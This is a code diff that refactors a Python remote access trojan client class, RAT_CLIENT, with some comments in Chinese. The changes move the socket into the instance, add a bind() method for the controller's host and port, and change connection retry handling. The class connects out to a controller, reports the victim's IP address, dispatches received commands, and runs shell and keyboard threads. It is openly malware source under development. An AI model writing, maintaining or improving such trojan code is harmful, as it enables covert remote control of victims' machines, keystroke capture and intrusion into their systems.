@@ -32,9 +32,7 @@ class Command(Enum):
 
 
 class RAT_CLIENT:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
+    def __init__(self):
         self.curdir = os.getcwd()
         self.on_client_connected = None
         self.send_buf = queue.Queue()
@@ -43,22 +41,27 @@ class RAT_CLIENT:
         self.keyboard = threading.Thread(target=self.run_keyboard)
         self.keyboard_buf = queue.Queue()
         self.shell.daemon = True
+        self.s = None
         
+    def bind(self, host, port):
+        self.host = host
+        self.port = port
+         
     def build_connection(self):
         '''
         开启连接
         '''
-        global s
-        s = None
-        # 重复请求连接，直到连接成功
-        while s is None:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((self.host, self.port))
-            except Exception as e:
-                s= None
+        if self.s is not None:
+            raise Exception("Connection already exists")
+        try:
+            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.s.connect((self.host, self.port))
+        except Exception as e:
+            self.s.close()
+            self.s= None
+            raise e
         sending = socket.gethostbyname(socket.gethostname())
-        s.send(sending.encode())
+        self.s.send(sending.encode())
     
     def excute(self):
         '''
@@ -76,7 +79,7 @@ class RAT_CLIENT:
             try:
                 if self.send_buf.empty() is False:
                     msg = self.send_buf.get()
-                    s.send(msg)
+                    self.s.send(msg)
                     
             except Exception as e:
                 break
@@ -90,7 +93,7 @@ class RAT_CLIENT:
         }
         while True:
             try:
-                msg = s.recv(1024)
+                msg = self.s.recv(1024)
                 logging.debug(f"Client: received message: {msg}")  # 输出日志信息
                 command = msg[:1]
                 handler = command_handers.get(command)
@@ -125,7 +128,7 @@ class RAT_CLIENT:
     def handle_exit_command(self, command):
         self.send_buf.put('exit')
         self.shell.join()
-        s.close()
+        self.s.close()
 
     def run_shell(self):
         while True:
